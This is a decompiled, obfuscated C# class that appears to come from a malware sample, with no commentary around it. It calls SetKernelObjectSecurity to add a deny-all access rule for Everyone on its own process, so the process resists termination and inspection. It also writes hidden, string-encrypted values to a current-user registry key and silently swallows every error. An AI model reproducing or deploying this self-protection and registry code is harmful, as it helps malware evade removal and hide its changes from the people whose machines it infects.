using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace VyjVuXvolaw;

internal sealed class IqvwXxhcozFA
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr FEvVjacYCXPDlv, int NVEFFjKepfL, [Out] byte[] vyWucaRjtQdhTs, uint oGxZNjDvGaU, out uint lYRnIapbGcT);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr jcaxlpeYOhNc, int spLeNBLZhOY, [In] byte[] HqkfLhnUit);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void EcOQQOepVyYZK(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107403427)));
			registryKey.SetValue(CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107403802)), getString_0(107404485));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor mSPenLITVCRZ(IntPtr intptr_0)
	{
		byte[] vyWucaRjtQdhTs = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, vyWucaRjtQdhTs, 0u, out var lYRnIapbGcT);
		if ((long)lYRnIapbGcT > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, vyWucaRjtQdhTs = new byte[lYRnIapbGcT], lYRnIapbGcT, out lYRnIapbGcT))
		{
			return null;
		}
		return new RawSecurityDescriptor(vyWucaRjtQdhTs, 0);
	}

	private void yeyJPYqxiE(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void IzzjMTsgYInhh()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = mSPenLITVCRZ(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			yeyJPYqxiE(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static IqvwXxhcozFA()
	{
		Strings.CreateGetStringDelegate(typeof(IqvwXxhcozFA));
	}
}
